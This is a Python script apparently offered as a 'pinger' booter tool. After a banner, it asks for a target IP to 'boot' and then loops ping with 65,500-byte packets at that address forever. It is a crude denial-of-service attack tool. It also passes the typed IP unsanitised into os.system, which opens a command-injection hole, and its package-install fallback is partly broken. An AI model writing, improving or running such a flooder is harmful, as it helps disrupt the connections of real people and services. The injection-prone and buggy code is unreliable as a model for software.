import os
os.system("cls")
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
    os.system("cls")
try:
    from time import sleep
except:
    os.system("pip install time")
    from time import sleep
    os.system("cls")
try:
    from tqdm import tqdm, trange
except:
    os.system("pip install tqdm")
    from time import sleep
    os.system("cls")

os.system("cls")
os.system("title Loading ")
print(f"{Fore.RED}")
progressbar = tqdm([1,2,3])
for item in progressbar:
    sleep(0.1)

    progressbar.set_description(' Loading... ')

os.system("cls")
os.system("title Ghost Chaos pinger By gh0st CHAOS#6511")
print(f"""{Fore.GREEN}




 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗     ██████╗██╗  ██╗ █████╗  ██████╗ ███████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔════╝
██║  ███╗███████║██║   ██║███████╗   ██║       ██║     ███████║███████║██║   ██║███████╗
██║   ██║██╔══██║██║   ██║╚════██║   ██║       ██║     ██╔══██║██╔══██║██║   ██║╚════██║
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ╚██████╗██║  ██║██║  ██║╚██████╔╝███████║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                                        
██████╗ ██╗███╗   ██╗ ██████╗ ███████╗██████╗                                           
██╔══██╗██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗                                          
██████╔╝██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝                                          
██╔═══╝ ██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗                                          
██║     ██║██║ ╚████║╚██████╔╝███████╗██║  ██║                                          
╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                          
                                                                                        





""")
ip = input(f"{Fore.RED}IP à boot : ")
os.system("color a")
while True:
	os.system("ping " + ip + " -t -l 65500")
